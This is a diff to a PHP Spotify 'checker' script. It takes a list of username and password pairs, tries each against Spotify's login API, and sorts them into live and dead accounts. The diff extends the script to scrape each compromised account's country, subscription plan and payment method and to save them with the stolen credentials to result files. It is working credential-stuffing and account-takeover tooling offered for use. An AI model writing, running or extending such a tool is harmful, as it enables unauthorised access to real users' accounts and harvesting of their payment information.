@@ -2,11 +2,11 @@
 error_reporting(0);
 /**
  * Author : Wahyu Arif Purnomo
- * Update : 2 September 2019
+ * Update : 3 September 2019
  * Please don't edit, respect me, if you want to be appreciated.
  */
-$climate->br()->info('Delimiters "username or email|password');
-$input = $climate->br()->input('List?');
+
+$input = $climate->input('List?');
 $list = $input->prompt();
 
 $input_save = $climate->info()->input('Save live results?');
@@ -47,9 +47,26 @@ for ($a = 0; $a < count($total); $a++) {
 	
 	$login = http("https://accounts.spotify.com/api/login", $post, $headers);
 	if(preg_match('/{"displayName":"/', $login)){
-        $climate->info( $no . '. Live | ' . $user .  ' | ' . $pass . ' | Token : ' . $token . '');
+        $overview_page = http(urldecode("https://www.spotify.com/id/account/overview/"));
+
+        preg_match_all('/,"paymentInfo":{"(.*)":{"name":"/', $overview_page, $ifelsepayment);
+            if($ifelsepayment[1][0] == "paymentMethod") {
+                preg_match_all('/paymentMethod":{"name":"(.*)","icon"/', $overview_page, $arifpayment);
+                $pay = $arifpayment[1][0];
+            } else {
+                $pay = "Kamu anggota dari paket Family.";
+            }
+
+        preg_match_all('/{"label":"Negara","value":"(.*)"}],/', $overview_page, $arifnegara);
+        preg_match_all('/,"plan":{"name":"(.*)","branding":/', $overview_page, $arifsub);
+        preg_match_all('/paymentMethod":{"name":"(.*)","icon"/', $overview_page, $arifpayment);
+
+        $climate->info( $no . '. Live | ' . $user .  ' | ' . $pass . ' | Negara : ' . $arifnegara[1][0] . ' | Paket : ' . $arifsub[1][0] . ' | Pembayaran : ' . $pay);
         $save = fopen("result/" . $save_file, 'a');
-        fwrite($save, $user . " | " . $pass . "\n");
+        fwrite($save, $user . " | " . $pass . " | " . $arifnegara[1][0] . " | " . $arifsub[1][0] . " | " . $pay . "\n");
+
+        $save_log = fopen("result/live.log", 'a');
+        fwrite($save_log, $user . " | " . $pass . "\n");
 	}else{
         $climate->error( $no . '. Die  | ' . $user .  ' | ' . $pass . ' | Token : ' . $token . '');
     }
@@ -58,7 +75,7 @@ for ($a = 0; $a < count($total); $a++) {
 $climate->br()->shout('Done, your result live saved in folder : result/' . $save_file);
 
 function Token(){
-	$get = http("https://accounts.spotify.com/en-US/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F");
+	$get = http("https://accounts.spotify.com/id/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F");
     preg_match_all('/set-cookie: csrf_token=(.*?);Version=1;/', $get, $arif);
     return $arif[1][0];
 }
@@ -88,6 +105,6 @@ function http($url, $post = false, $headers = false)
 
 /**
  * Author : Wahyu Arif Purnomo
- * Update : 2 September 2019
+ * Update : 3 September 2019
  * Please don't edit, respect me, if you want to be appreciated.
  */
